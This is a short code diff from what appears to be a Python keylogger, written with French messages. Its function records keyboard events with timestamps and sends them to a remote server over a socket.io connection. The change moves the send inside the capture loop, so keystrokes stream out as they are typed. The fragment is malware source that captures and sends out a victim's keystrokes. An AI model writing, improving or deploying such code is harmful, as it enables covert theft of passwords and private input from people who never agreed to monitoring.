@@ -77,7 +77,7 @@ def record_and_send_keyboard_log(duration=10, sio=None):
             event = keyboard.read_event()
             keyboard_log.append((event.name, event.time))
 
-        sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
+            sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
 
         print("Enregistrement du keylogger terminé")
     except Exception as e:
